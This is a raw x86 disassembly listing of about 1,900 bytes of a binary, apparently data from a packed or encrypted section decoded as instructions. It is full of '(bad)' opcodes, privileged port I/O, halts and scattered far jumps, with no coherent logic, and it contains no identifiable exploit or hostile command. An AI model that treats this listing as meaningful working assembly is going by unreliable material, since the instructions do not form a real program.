  436fbe:	pusha  
  436fbf:	jge    0x436f84
  436fc1:	lahf   
  436fc2:	pop    ebp
  436fc3:	in     eax,0x60
  436fc5:	loop   0x436fe2
  436fc7:	aam    0x43
  436fc9:	into   
  436fca:	repz cld 
  436fcc:	enter  0x3298,0xbd
  436fd0:	mov    ch,bl
  436fd2:	test   eax,0x398cb92b
  436fd7:	cmp    bh,cl
  436fd9:	jae    0x437017
  436fdb:	leave  
  436fdc:	mov    DWORD PTR [ebx],ebx
  436fde:	stos   DWORD PTR es:[edi],eax
  436fdf:	pop    edi
  436fe0:	leave  
  436fe1:	fldenv [esi+0xe53b062]
  436fe7:	and    dh,ch
  436fe9:	add    dh,BYTE PTR [ecx]
  436feb:	pop    ebp
  436fec:	pop    edx
  436fed:	push   0x277e51b7
  436ff2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436ff3:	jnp    0x437041
  436ff5:	mov    eax,0x452fff60
  436ffa:	jmp    0x9ae3:0x56b7b4a1
  437001:	rcr    BYTE PTR [edx-0x2c],1
  437004:	jno    0x437003
  437006:	mov    dh,0xce
  437008:	int3   
  437009:	add    al,BYTE PTR [eax-0x48]
  43700c:	adc    ah,BYTE PTR ds:0x40a8f4d7
  437012:	push   ds
  437013:	shl    DWORD PTR [esi*8+0x4c3572b],1
  43701a:	push   eax
  43701b:	fdivr  QWORD PTR [esi+0x6fef6002]
  437021:	xchg   esi,eax
  437022:	enter  0xa83d,0x12
  437026:	pop    ds
  437027:	xchg   ebp,eax
  437028:	push   ss
  437029:	int3   
  43702a:	pop    ebx
  43702b:	jae    0x437093
  43702d:	stos   BYTE PTR es:[edi],al
  43702e:	jl     0x437005
  437030:	and    edi,ecx
  437032:	push   ds
  437033:	mov    esi,0x992abec5
  437038:	mov    DWORD PTR [ecx+0x71aee671],esp
  43703e:	mov    bl,0xdd
  437040:	ins    BYTE PTR es:[edi],dx
  437041:	sub    al,0x9c
  437043:	into   
  437044:	push   ebp
  437045:	mov    dl,0x7e
  437047:	mov    ecx,0x84fe7e08
  43704c:	fnop   
  43704e:	pusha  
  43704f:	aas    
  437050:	loope  0x437013
  437052:	jge    0x437031
  437054:	rcl    DWORD PTR [ecx-0x7b],cl
  437057:	shl    BYTE PTR [ebx+eiz*1-0x5d],0xd0
  43705c:	xchg   esp,eax
  43705d:	xlat   BYTE PTR ds:[ebx]
  43705e:	jg     0x4370ca
  437060:	popf   
  437061:	inc    esp
  437062:	lahf   
  437063:	xchg   esi,eax
  437064:	jge    0x43708a
  437066:	pop    ds
  437067:	jno    0x43701e
  437069:	pusha  
  43706a:	out    0x8b,al
  43706c:	and    al,0x4e
  43706e:	cmp    eax,0x5f6b8ed1
  437073:	xor    bh,BYTE PTR [esi-0xf038a3c]
  437079:	aam    0x1f
  43707b:	imul   esi,DWORD PTR [ecx],0x94b88005
  437081:	pop    edi
  437082:	or     eax,0x5e032ccb
  437087:	arpl   WORD PTR [edx+edx*2+0x662eb60],bx
  43708e:	jle    0x437083
  437090:	fcom   QWORD PTR [ecx-0x5a767695]
  437096:	bound  ebp,QWORD PTR [eax-0x2b44ba56]
  43709c:	adc    BYTE PTR [ecx-0x2bdca11e],dl
  4370a2:	add    edi,edi
  4370a4:	mul    cl
  4370a6:	dec    esp
  4370a7:	shl    DWORD PTR [eax+edx*2-0x6e],cl
  4370ab:	jae    0x437127
  4370ad:	add    ecx,DWORD PTR [edx-0x33]
  4370b0:	or     eax,edx
  4370b2:	in     eax,0xf3
  4370b4:	shl    DWORD PTR [edx],1
  4370b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4370b7:	lahf   
  4370b8:	retf   
  4370b9:	in     al,dx
  4370ba:	pop    ds
  4370bb:	(bad)  
  4370bc:	sbb    DWORD PTR [ebx+0x72],edx
  4370bf:	hlt    
  4370c0:	and    eax,DWORD PTR [ebx]
  4370c2:	fsubr  DWORD PTR [eax+0x1e183921]
  4370c8:	or     eax,0x830f1f23
  4370cd:	mov    edi,0x15c6f72
  4370d2:	mov    cl,0xe8
  4370d4:	mov    edx,0x6ed43cd6
  4370d9:	add    al,0x33
  4370db:	(bad)  
  4370dc:	cmp    DWORD PTR [ebp-0x10],esi
  4370df:	xchg   esi,eax
  4370e0:	mov    bl,0x2b
  4370e2:	fisubr WORD PTR [edi-0x77]
  4370e5:	repnz (bad) 
  4370e8:	imul   cl
  4370ea:	adc    ebp,0xffffff80
  4370ed:	test   al,0x8
  4370ef:	lock or al,0x41
  4370f2:	inc    esi
  4370f3:	outs   dx,BYTE PTR ds:[esi]
  4370f4:	mov    DWORD PTR [edi+0xdac056b],edi
  4370fa:	push   ds
  4370fb:	push   edi
  4370fc:	mov    dl,0x48
  4370fe:	int3   
  4370ff:	adc    dh,0x9e
  437102:	sahf   
  437103:	and    ah,BYTE PTR [ecx-0x72a9202f]
  437109:	pop    edx
  43710a:	pop    es
  43710b:	xor    eax,DWORD PTR [ecx-0x564d89af]
  437111:	test   DWORD PTR [edi],ebx
  437113:	or     al,0x6e
  437115:	test   al,0xec
  437117:	stos   BYTE PTR es:[edi],al
  437118:	jge    0x437134
  43711a:	add    BYTE PTR [eax+0xaaebef2],bl
  437120:	or     ebp,esp
  437122:	pop    esp
  437123:	dec    edi
  437124:	mov    es,WORD PTR [ebx-0xd]
  437127:	pop    eax
  437128:	adc    al,ah
  43712a:	jg     0x4370f1
  43712c:	bound  edx,QWORD PTR [edx-0x27]
  43712f:	aam    0xc
  437131:	data16 fisub WORD PTR [ebx+0x45]
  437135:	jp     0x4371a8
  437137:	pop    ds
  437138:	xchg   edi,eax
  437139:	add    eax,0x45c0536f
  43713e:	mov    bh,0xf
  437140:	cmp    al,0xa5
  437142:	mov    cl,0xd4
  437144:	fsubr  DWORD PTR [esi+0x1d]
  437147:	or     cl,BYTE PTR [edx]
  437149:	sbb    al,0xa7
  43714b:	jmp    0x1185:0x3bf6f388
  437152:	add    ebx,DWORD PTR [eax+0x78]
  437155:	sbb    al,0x66
  437157:	xchg   ebp,eax
  437158:	enter  0x3a86,0x5e
  43715c:	cwde   
  43715d:	ins    BYTE PTR es:[edi],dx
  43715e:	sbb    bh,BYTE PTR [edx+esi*4-0x765d3d23]
  437165:	pop    edi
  437166:	inc    edi
  437167:	or     al,0xc
  437169:	push   eax
  43716a:	in     eax,0xd5
  43716c:	(bad)  
  43716d:	faddp  st(0),st
  43716f:	pop    ds
  437170:	std    
  437171:	in     eax,dx
  437172:	fdivr  st(2),st
  437174:	mov    es,WORD PTR [edi+0x784c245a]
  43717a:	mov    eax,0x309b8ef5
  43717f:	xlat   BYTE PTR ds:[ebx]
  437180:	xchg   ecx,eax
  437181:	mov    esi,0x99d0fa97
  437186:	into   
  437187:	adc    DWORD PTR [ecx+0x44e7f467],ecx
  43718d:	fmul   QWORD PTR [edx-0x5f]
  437190:	xor    BYTE PTR [edx],al
  437192:	int3   
  437193:	xchg   BYTE PTR [ebx-0x207a6c81],bl
  437199:	xchg   ecx,eax
  43719a:	pusha  
  43719b:	xchg   edi,eax
  43719c:	xchg   edi,eax
  43719d:	in     al,0xe3
  43719f:	jg     0x43713d
  4371a1:	jle    0x4371dd
  4371a3:	xlat   BYTE PTR ds:[ebx]
  4371a4:	or     bl,dl
  4371a6:	les    eax,FWORD PTR [edi+0x7e]
  4371a9:	push   ebp
  4371aa:	in     al,dx
  4371ab:	add    BYTE PTR [ebp+eiz*1+0x42bd58b4],dl
  4371b2:	dec    eax
  4371b3:	xchg   ecx,eax
  4371b4:	xor    BYTE PTR [edi-0x3c],al
  4371b7:	cwde   
  4371b8:	mov    ebp,0x8bd45c27
  4371bd:	or     dl,bh
  4371bf:	mov    ss,WORD PTR [eax-0x3f]
  4371c2:	pop    ds
  4371c3:	ja     0x437199
  4371c5:	mov    ah,0x5e
  4371c8:	mov    ebx,0x185a0376
  4371cd:	pop    ebx
  4371ce:	sbb    al,0xd4
  4371d0:	pop    ss
  4371d1:	arpl   WORD PTR [ebx],bx
  4371d3:	mov    ecx,edi
  4371d5:	jmp    0x6dcd9d1f
  4371da:	jle    0x43721e
  4371dc:	mov    dl,0x7f
  4371de:	dec    ebx
  4371df:	cwde   
  4371e0:	or     BYTE PTR [ecx+edi*1],bl
  4371e3:	push   edx
  4371e4:	xchg   ebx,eax
  4371e5:	inc    edi
  4371e6:	fs jb  0x43718b
  4371e9:	test   DWORD PTR ds:0x21b31c73,edi
  4371ef:	fisttp WORD PTR [ecx-0x38d0b1eb]
  4371f5:	pop    ebx
  4371f6:	or     BYTE PTR [ecx+0x2f0044c9],ah
  4371fc:	loop   0x437195
  4371fe:	xchg   ebx,eax
  4371ff:	inc    BYTE PTR ds:0x28936c23
  437205:	mov    ebx,0x56931960
  43720a:	adc    BYTE PTR [esp+ecx*2+0x1],0x6a
  43720f:	aad    0x2b
  437211:	das    
  437212:	loopne 0x4371ca
  437214:	sub    al,bh
  437216:	pop    ss
  437217:	pop    edx
  437218:	mov    DWORD PTR [ecx+0x14],esp
  43721b:	popa   
  43721c:	test   al,0xcc
  43721e:	ret    
  43721f:	inc    esi
  437220:	adc    DWORD PTR [eax+ebx*4],0x2b8efe58
  437227:	xor    al,0x49
  437229:	popa   
  43722a:	sbb    eax,DWORD PTR [esi-0x78]
  43722d:	xor    eax,0x64242cd5
  437232:	mov    ds:0x7600f393,al
  437237:	cmp    al,dl
  437239:	stos   BYTE PTR es:[edi],al
  43723a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43723b:	jmp    0x437285
  43723d:	xchg   edx,eax
  43723e:	sbb    BYTE PTR [esi],dh
  437240:	mov    ecx,esp
  437242:	test   eax,0xe421ca09
  437247:	pop    eax
  437248:	icebp  
  437249:	dec    eax
  43724a:	hlt    
  43724b:	inc    BYTE PTR [ecx]
  43724d:	sbb    dl,BYTE PTR [ebx-0x537cda66]
  437253:	xchg   esp,eax
  437254:	or     al,0x4c
  437256:	pop    ds
  437257:	out    0xf4,eax
  437259:	in     eax,dx
  43725a:	xchg   BYTE PTR [edi],bh
  43725c:	fadd   DWORD PTR [ebx]
  43725e:	push   ebx
  43725f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437260:	cmp    esp,edi
  437262:	push   edi
  437263:	or     DWORD PTR [ecx-0x70ea591f],ecx
  437269:	jg     0x437272
  43726b:	mov    al,ds:0xd4a9da18
  437270:	not    BYTE PTR [edi+ecx*4+0x716f021]
  437277:	aam    0x74
  437279:	adc    BYTE PTR [ecx-0xf],dh
  43727c:	jge    0x4372f3
  43727e:	sbb    ebp,DWORD PTR [ecx]
  437280:	mov    BYTE PTR [ebx+0xe],dl
  437283:	jne    0x437298
  437285:	int    0xe4
  437287:	sbb    ch,BYTE PTR [edi]
  437289:	add    dh,dl
  43728b:	(bad)  
  43728c:	mov    ebp,0xb693f8eb
  437291:	ss push ds
  437293:	pop    ecx
  437294:	ret    0x7d3f
  437297:	hlt    
  437298:	jbe    0x4372e5
  43729a:	(bad)  
  43729c:	jl     0x4372ab
  43729e:	aaa    
  43729f:	inc    eax
  4372a0:	stos   DWORD PTR es:[edi],eax
  4372a1:	fcmovnu st,st(7)
  4372a3:	mov    ds:0xd960b45e,al
  4372a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4372a9:	pop    esi
  4372aa:	mov    al,0x61
  4372ac:	dec    esi
  4372ad:	cmp    DWORD PTR [ebp+0x163215d4],ebx
  4372b3:	into   
  4372b4:	sbb    BYTE PTR [eax],dl
  4372b6:	add    eax,0x6b6788d0
  4372bb:	mov    edi,0x106dbabb
  4372c0:	mov    bl,0x2
  4372c2:	sbb    al,0x50
  4372c4:	(bad)  
  4372c5:	xchg   ecx,eax
  4372c6:	mov    WORD PTR es:[ebx],gs
  4372c9:	push   ebx
  4372ca:	popa   
  4372cb:	mov    bl,0x49
  4372cd:	add    eax,0x660e8a84
  4372d2:	iret   
  4372d3:	lods   al,BYTE PTR ds:[esi]
  4372d4:	xor    ch,dh
  4372d6:	jge    0x4372ac
  4372d8:	mov    edi,0x25323574
  4372dd:	push   cs
  4372de:	out    0x7e,eax
  4372e0:	mov    ebx,DWORD PTR [ecx]
  4372e2:	push   edi
  4372e3:	mov    ds:0xb4c810a2,al
  4372e8:	sbb    BYTE PTR [ebx-0x3a],dh
  4372eb:	aam    0x69
  4372ed:	clc    
  4372ee:	aam    0x1e
  4372f0:	int    0xae
  4372f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4372f3:	pop    eax
  4372f4:	mov    DWORD PTR [ecx-0x1e],edi
  4372f7:	pop    ebx
  4372f8:	pop    eax
  4372f9:	push   ebp
  4372fa:	cmp    edi,0x2
  4372fd:	inc    ebp
  4372fe:	call   0x5cd4:0xda44932c
  437305:	push   0xffffffb7
  437307:	arpl   WORD PTR [ebp+0x5e],di
  43730a:	jp     0x437291
  43730c:	ror    DWORD PTR [esi+0x3e],cl
  43730f:	xlat   BYTE PTR ds:[ebx]
  437310:	outs   dx,BYTE PTR ds:[esi]
  437311:	inc    ecx
  437312:	push   cs
  437313:	fimul  DWORD PTR [ebp-0x71f023fe]
  437319:	gs dec eax
  43731b:	test   BYTE PTR [edx-0x36],0x60
  43731f:	ret    
  437320:	mov    esi,0x70530d4b
  437325:	mov    ebx,0xb94bd5e1
  43732a:	out    0x2f,al
  43732c:	in     eax,0xed
  43732e:	and    eax,0xbc0f8c23
  437333:	call   0x68e7:0xa9194775
  43733a:	push   ds
  43733b:	mov    edx,0xaaa1a62e
  437340:	jb     0x437350
  437342:	cmp    eax,DWORD PTR [edx]
  437344:	mov    ch,0x23
  437346:	sahf   
  437347:	cmp    eax,0xa2a6ea47
  43734c:	mov    bh,dl
  43734e:	ficom  DWORD PTR [edx-0x4f]
  437351:	mov    al,ds:0x48844908
  437356:	clc    
  437357:	jns    0x437354
  437359:	cmp    BYTE PTR [ebx-0x775c6f1],0x15
  437360:	mov    bh,cl
  437362:	push   ebp
  437363:	pushf  
  437364:	xor    BYTE PTR [edx+0x2b8bb0e],dh
  43736a:	jl     0x4373be
  43736c:	add    al,0x4e
  43736e:	mov    edx,0x6ea0831a
  437373:	fld    QWORD PTR [ebp-0x64]
  437376:	gs jae 0x4373a1
  437379:	call   0x3cad:0x8be8dd68
  437380:	shl    ah,1
  437382:	out    0xd5,al
  437384:	pop    edi
  437385:	adc    BYTE PTR [ecx],bl
  437387:	and    bh,BYTE PTR [ebx-0x5f]
  43738a:	(bad)  
  43738b:	retf   
  43738c:	push   0x896c12fb
  437391:	xchg   ebp,eax
  437392:	xchg   edi,eax
  437393:	dec    edi
  437394:	mov    fs,WORD PTR [esi+0x17]
  437397:	inc    ecx
  437398:	ds inc esi
  43739a:	pushf  
  43739b:	inc    ebp
  43739c:	mov    al,BYTE PTR ds:0x6e79e4b4
  4373a2:	inc    eax
  4373a3:	ret    0x14f8
  4373a6:	pop    ds
  4373a7:	jnp    0x43741e
  4373a9:	or     ebx,ebp
  4373ab:	imul   ebx,DWORD PTR [ebx-0xf],0x251cf54
  4373b2:	and    al,0xe9
  4373b4:	(bad)  
  4373b5:	call   0x7e7c1133
  4373ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4373bb:	test   DWORD PTR [esi+eax*8+0x7195b1f],0x3a5275b
  4373c6:	cli    
  4373c7:	int3   
  4373c8:	(bad)  
  4373c9:	imul   ebp,DWORD PTR [ebx],0xffffffbf
  4373cc:	lods   al,BYTE PTR ds:[esi]
  4373cd:	mov    ch,0x8e
  4373cf:	push   cs
  4373d0:	mov    BYTE PTR [ebx-0x5e],ch
  4373d3:	ja     0x437363
  4373d5:	or     eax,DWORD PTR ds:0x89c22688
  4373db:	mov    eax,ds:0x198fd915
  4373e0:	mov    BYTE PTR [edi+0x5f],dl
  4373e3:	test   dh,bh
  4373e5:	xor    al,0x61
  4373e7:	push   ebx
  4373e8:	inc    edi
  4373e9:	add    esp,DWORD PTR [edx+0x4b]
  4373ec:	or     cl,cl
  4373ee:	push   esi
  4373ef:	cmp    DWORD PTR [esi+0x1c],esp
  4373f2:	sbb    esi,DWORD PTR [edx+0x30]
  4373f5:	into   
  4373f6:	inc    ebx
  4373f7:	shl    DWORD PTR ds:0x1f427e8b,cl
  4373fd:	inc    eax
  4373fe:	aaa    
  4373ff:	hlt    
  437400:	imul   edi,DWORD PTR [esp+eiz*2],0xae0202c7
  437407:	inc    ebp
  437408:	mov    bh,0xb3
  43740a:	cmovg  esp,DWORD PTR [ebx]
  43740d:	add    DWORD PTR [esi],ebx
  43740f:	jge    0x4373b6
  437411:	ja     0x4373e3
  437413:	inc    esp
  437414:	fcomp  st(6)
  437416:	fisubr WORD PTR [ebx+0x4d94b5f0]
  43741c:	in     eax,0xa5
  43741e:	leave  
  43741f:	stos   BYTE PTR es:[edi],al
  437420:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437421:	pop    ecx
  437422:	mov    dh,0x9b
  437424:	mov    ebx,0x8d2d69e7
  437429:	fwait
  43742a:	pop    ds
  43742b:	pop    edx
  43742c:	mov    eax,0x19f957ba
  437431:	add    ah,BYTE PTR [ecx+ebp*8-0x1]
  437435:	outs   dx,DWORD PTR ds:[esi]
  437436:	mov    ss,WORD PTR [ebx]
  437438:	adc    ebx,ebx
  43743a:	popa   
  43743b:	xchg   ecx,eax
  43743c:	leave  
  43743d:	sbb    al,0x2d
  43743f:	mov    ch,0xf1
  437441:	xor    esp,esp
  437443:	mov    cl,0x3a
  437445:	xor    ebp,DWORD PTR [ecx]
  437447:	fist   DWORD PTR [edi+0x2]
  43744a:	in     al,dx
  43744b:	adc    DWORD PTR [ecx],ecx
  43744d:	mov    dl,BYTE PTR [eax-0x28]
  437450:	fwait
  437451:	pop    es
  437452:	pop    ds
  437453:	retf   
  437454:	popa   
  437455:	dec    esi
  437456:	sbb    eax,0xba5063f3
  43745b:	pop    esp
  43745c:	call   0x52769366
  437461:	xor    eax,0x4c2722fb
  437466:	push   ds
  437467:	stc    
  437468:	mov    bl,0x71
  43746a:	adc    eax,0x6a7338f9
  43746f:	aad    0x31
  437471:	daa    
  437472:	xor    cl,BYTE PTR [ecx+0x54]
  437475:	daa    
  437476:	inc    ebx
  437477:	pop    ss
  437478:	mov    BYTE PTR [ecx],dl
  43747a:	scas   al,BYTE PTR es:[edi]
  43747b:	js     0x43741c
  43747d:	repnz add BYTE PTR [ecx],dl
  437480:	neg    dl
  437482:	mov    ah,0x9c
  437484:	or     BYTE PTR [esp+eax*4-0x30],bl
  437488:	xor    al,0x94
  43748a:	and    eax,0x9f674dfa
  43748f:	je     0x4374f9
  437491:	mov    esi,0x85624f1f
  437496:	ret    0xe655
  437499:	repz pop ds
  43749b:	aam    0x1c
  43749d:	ins    BYTE PTR es:[edi],dx
  43749e:	icebp  
  43749f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4374a0:	aas    
  4374a1:	pop    ecx
  4374a2:	bound  esp,QWORD PTR [ebx-0x78]
  4374a5:	push   edi
  4374a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4374a7:	mov    ds:0x9050b9ed,al
  4374ac:	repz add eax,0x8eed9b2e
  4374b2:	or     eax,0x9590680e
  4374b7:	sub    ebx,DWORD PTR [ebp+0x6946af02]
  4374bd:	sbb    cl,BYTE PTR gs:[eax+0x28d8485b]
  4374c4:	pusha  
  4374c5:	add    edx,DWORD PTR [eax+0x4f]
  4374c8:	ret    0x81d9
  4374cb:	inc    ebp
  4374cc:	aad    0x91
  4374ce:	repnz es mov edi,ebx
  4374d2:	dec    ebx
  4374d3:	jle    0x43752d
  4374d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4374d6:	cmp    BYTE PTR [ebx+0x435c3453],dl
  4374dc:	cmp    DWORD PTR [ebx],eax
  4374de:	sub    al,0x62
  4374e0:	lds    esi,FWORD PTR [edx]
  4374e2:	mov    esp,0x7287895f
  4374e7:	or     BYTE PTR [ecx+0x1],al
  4374ea:	sbb    eax,0x23cdc98
  4374ef:	lods   eax,DWORD PTR ds:[esi]
  4374f0:	push   0x96f27c00
  4374f5:	push   eax
  4374f6:	cdq    
  4374f7:	cmc    
  4374f8:	sub    ebp,DWORD PTR [ebx]
  4374fa:	ins    DWORD PTR es:[edi],dx
  4374fb:	dec    ebx
  4374fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4374fd:	cmp    esi,ebx
  4374ff:	pop    ebx
  437500:	enter  0xe398,0x32
  437504:	mov    eax,ds:0x594c0218
  437509:	sbb    esi,DWORD PTR [ebp+edx*8-0x665da60c]
  437510:	xchg   esi,eax
  437511:	add    DWORD PTR [eax-0x15],eax
  437514:	rol    DWORD PTR [edx-0x47],1
  437517:	xor    DWORD PTR [eax+esi*4-0x5d9e29cc],eax
  43751e:	cld    
  43751f:	stc    
  437520:	push   ss
  437521:	pop    es
  437522:	jns    0x4374b8
  437524:	arpl   WORD PTR ds:0x2356f99,sp
  43752a:	mov    ds:0x10617f1f,al
  43752f:	jp     0x4374cd
  437531:	add    eax,0x23ba2a3e
  437536:	pop    eax
  437537:	mov    ebx,0x8560833f
  43753c:	sub    ah,dl
  43753e:	loope  0x4375a1
  437540:	mov    bh,0x67
  437542:	retf   0xa8cc
  437545:	test   BYTE PTR [ebx+edi*4+0x12],0x57
  43754a:	push   ecx
  43754b:	adc    DWORD PTR [eax+0x239580c4],ecx
  437551:	pop    ds
  437552:	add    al,0xd8
  437554:	mov    BYTE PTR [ebp+0x59],ch
  437557:	(bad)  
  437559:	mov    edx,0x5d2be6a
  43755e:	cld    
  43755f:	xor    DWORD PTR [edx-0x54ed09c4],ebp
  437565:	or     ebp,DWORD PTR [eax+0x45]
  437568:	loopne 0x43758e
  43756a:	and    al,0x2c
  43756c:	mov    dh,cl
  43756e:	pop    eax
  43756f:	xchg   esp,eax
  437570:	arpl   WORD PTR [esi+eiz*2],bp
  437573:	js     0x43757d
  437575:	cmp    BYTE PTR [edi],bl
  437577:	pushf  
  437578:	jge    0x43755a
  43757a:	add    ebx,ecx
  43757c:	mov    edi,esi
  43757e:	jg     0x437538
  437580:	xlat   BYTE PTR ds:[ebx]
  437581:	mov    bl,0x2c
  437583:	imul   eax,DWORD PTR ds:0x7ac04434
  43758a:	bound  ebp,QWORD PTR [esi+0x7d1f970d]
  437590:	push   esp
  437591:	scas   eax,DWORD PTR es:[edi]
  437592:	cmp    DWORD PTR [ebx],ecx
  437594:	shl    BYTE PTR [ebx-0x30eb29ba],0x37
  43759b:	out    0x9e,al
  43759d:	mov    dh,0x43
  43759f:	int3   
  4375a0:	jp     0x4375db
  4375a2:	ins    DWORD PTR es:[edi],dx
  4375a3:	leave  
  4375a4:	(bad)  
  4375a5:	fimul  DWORD PTR [ebx-0x65]
  4375a8:	outs   dx,BYTE PTR ds:[esi]
  4375a9:	sbb    eax,DWORD PTR es:[esp+esi*1-0x9]
  4375ae:	add    ebp,DWORD PTR [edx+0x40374669]
  4375b4:	test   BYTE PTR [ebx-0x4d65c4de],0x18
  4375bb:	ins    DWORD PTR es:[edi],dx
  4375bc:	mov    BYTE PTR [ebp-0x60],al
  4375bf:	jl     0x4375e6
  4375c1:	gs mov esi,0x5d235f9e
  4375c7:	retf   0x4960
  4375ca:	fsub   QWORD PTR [eax+eax*2-0x2ab92ae8]
  4375d1:	add    eax,0xe90b0df7
  4375d6:	pusha  
  4375d7:	xchg   ebx,eax
  4375d8:	and    ebx,ecx
  4375da:	das    
  4375db:	(bad)  
  4375dc:	call   DWORD PTR [ebx-0x17b2bf01]
  4375e2:	pop    ds
  4375e3:	pop    ebx
  4375e4:	or     BYTE PTR [eax],al
  4375e6:	xlat   BYTE PTR gs:[ebx]
  4375e8:	outs   dx,DWORD PTR ds:[esi]
  4375e9:	mov    edi,0xa989c324
  4375ee:	gs je  0x43760f
  4375f1:	neg    BYTE PTR [edx+ecx*4-0x6a]
  4375f5:	sub    DWORD PTR [edx],esp
  4375f7:	jae    0x437666
  4375f9:	fistp  DWORD PTR [edi+0x2d]
  4375fc:	imul   ecx,DWORD PTR [ecx],0xffffffd8
  4375ff:	jmp    0x5c6d:0x386b6d8d
  437606:	cmp    ebp,DWORD PTR ds:0x74154582
  43760c:	pop    edx
  43760d:	test   DWORD PTR [edi],esi
  43760f:	stos   DWORD PTR es:[edi],eax
  437610:	mov    BYTE PTR [ecx-0x72],ch
  437613:	mov    edx,0x7259357c
  437618:	mov    BYTE PTR [ecx],dh
  43761a:	hlt    
  43761b:	wbinvd 
  43761d:	adc    al,0x9a
  43761f:	sub    esp,DWORD PTR [ebx]
  437621:	mov    dl,0x3b
  437623:	mov    BYTE PTR gs:[ebx+0xb4e75d7],ah
  43762a:	add    BYTE PTR [ebp-0x78],bh
  43762d:	inc    ebx
  43762e:	call   0x7ef2:0x98d01d2
  437635:	add    ebx,DWORD PTR [ebp+eax*2-0x3c]
  437639:	fwait
  43763a:	inc    edx
  43763b:	or     DWORD PTR [eax],esp
  43763d:	rcr    DWORD PTR [ebx-0x26ffc3fb],1
  437643:	dec    edi
  437644:	pop    eax
  437645:	sbb    eax,0xc9c9039e
  43764a:	aaa    
  43764b:	inc    ecx
  43764c:	leave  
  43764d:	xor    ebx,DWORD PTR [esi]
  43764f:	call   0xd6b77346
  437654:	inc    edx
  437655:	and    ebp,DWORD PTR [ebx]
  437657:	scas   eax,DWORD PTR es:[edi]
  437658:	mov    ecx,esi
  43765a:	add    al,dh
  43765c:	xchg   edx,eax
  43765d:	sub    DWORD PTR [esi+0x61],edx
  437660:	loope  0x437681
  437662:	ins    BYTE PTR es:[edi],dx
  437663:	xor    eax,0x128458fa
  437668:	cmp    DWORD PTR [edi],edi
  43766a:	jge    0x43765d
  43766c:	bound  esp,QWORD PTR [esi]
  43766e:	fist   WORD PTR [ecx-0x48]
  437671:	ror    DWORD PTR [edi-0x24],1
  437674:	jns    0x4376a3
  437676:	(bad)  
  437677:	sbb    eax,0x6b1ffc68
  43767c:	repnz xor al,0x71
  43767f:	in     eax,dx
  437680:	fnstenv [ebx+0x5788b2b0]
  437686:	mov    ch,0x90
  437688:	rol    BYTE PTR ds:0x1e766839,cl
  43768e:	inc    eax
  43768f:	cld    
  437690:	sub    dh,BYTE PTR [esi-0x1ef6faf7]
  437696:	retf   0x88ed
  437699:	jecxz  0x4376be
  43769b:	sahf   
  43769c:	xor    eax,0xcd5697b0
  4376a1:	pop    ds
  4376a2:	mov    esp,0x395a7954
  4376a7:	mov    dh,0xe9
  4376a9:	hlt    
  4376aa:	ds popa 
  4376ac:	mov    BYTE PTR [ebx],dh
  4376ae:	shl    esi,cl
  4376b0:	adc    dl,ah
  4376b2:	popw   ss
  4376b4:	xchg   esi,eax
  4376b5:	add    eax,0xb3ef46c6
  4376ba:	retf   
  4376bb:	mov    dl,0x6b
  4376bd:	sbb    bl,BYTE PTR [edi]
  4376bf:	cmp    DWORD PTR [eax-0x3],esp
  4376c2:	je     0x437678
  4376c4:	xchg   esp,eax
  4376c5:	fs cmp eax,0x463f1bad
  4376cb:	fadd   DWORD PTR [esi+0x7d]
  4376ce:	mov    ah,0xa8
  4376d0:	fsub   DWORD PTR [edx-0x386af5f6]
  4376d6:	or     ch,BYTE PTR [ecx-0x4d]
  4376d9:	lds    ebx,FWORD PTR [ebx-0x48]
  4376dc:	clc    
  4376dd:	rol    BYTE PTR [esi],1
  4376df:	xlat   BYTE PTR ds:[ebx]
  4376e0:	and    al,0xb1
  4376e2:	adc    edi,esp
  4376e4:	pop    edx
  4376e5:	sbb    al,ch
  4376e7:	mov    ds:0x4cb41388,al
  4376ec:	rol    BYTE PTR [ebx],cl
  4376ee:	and    esi,DWORD PTR [ecx-0x27fa0958]
  4376f4:	xor    BYTE PTR [edx],al
  4376f6:	aam    0xec
  4376f8:	bound  ebp,QWORD PTR [eax+eiz*4-0x45]
  4376fc:	sahf   
  4376fd:	(bad)  
  4376fe:	pusha  
  4376ff:	(bad)  
  437700:	pop    esp
  437701:	into   
  437702:	jmp    0x1d4a35d7
  437707:	test   al,0x25
  437709:	mov    dl,0x29
  43770b:	pop    eax
  43770c:	ret    
  43770d:	add    cl,BYTE PTR [edi]
  43770f:	mov    bl,0xa8
  437711:	sub    bl,BYTE PTR [edi]
  437713:	jmp    0x10e7d482
  437718:	repz sbb BYTE PTR [edx-0x3f],dl
  43771c:	stos   DWORD PTR es:[edi],eax
  43771d:	xchg   ebp,eax
  43771e:	daa    
  43771f:	xor    al,0x89
  437721:	aas    
  437722:	arpl   WORD PTR [ebp-0x45],si
  437725:	push   edi
  437726:	and    edi,DWORD PTR [eax]
  437728:	and    ebp,0x4
  43772b:	xchg   edi,eax
  43772c:	push   ds
  43772d:	rcr    BYTE PTR [edi-0x6377fb9a],1
  437733:	stos   BYTE PTR es:[edi],al
  437734:	addr16 sub ah,bl
  437737:	sbb    al,0x24
  437739:	inc    esp
  43773a:	pop    edi
  43773b:	js     0x4376e7
  43773d:	bound  edi,QWORD PTR ds:0x2133894a
  437743:	lock lds ecx,FWORD PTR [ecx+0x72c86eee]
  43774a:	xchg   esp,eax
  43774b:	sbb    eax,0x8a084489
  437750:	sub    BYTE PTR [ecx+0x62],dl
  437753:	mov    ebp,0x2af91789
  437758:	sub    eax,0xd4faa5de
  43775d:	add    dh,dl
  43775f:	mov    ah,0x4e
  437761:	jne    0x612dafbc
  437767:	int    0xf7
  437769:	(bad)  
  43776b:	das    
  43776c:	push   ebp
  43776d:	outs   dx,BYTE PTR ds:[esi]
  43776e:	fld    QWORD PTR [ebp-0x6aabfcf9]
  437774:	cmp    BYTE PTR [ecx+0x4b],0x4c
  437778:	js     0x4377cb
  43777a:	add    eax,0x1228b8d5
